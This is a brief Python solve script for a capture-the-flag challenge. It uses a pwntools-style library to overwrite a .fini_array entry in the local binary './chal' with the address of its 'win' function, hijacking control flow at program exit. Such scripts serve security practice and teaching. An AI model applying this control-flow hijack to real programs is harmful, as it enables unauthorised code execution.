from binascii import *
from ctflib.pwn import *

e = ELF("./chal")
context.binary = e
p = process("./chal")

fini_addr = get_section_address(e, ".fini_array")
print(fini_addr)
p.sendline(str(fini_addr).encode()+b" "+str(e.sym.win).encode())
p.interactive()
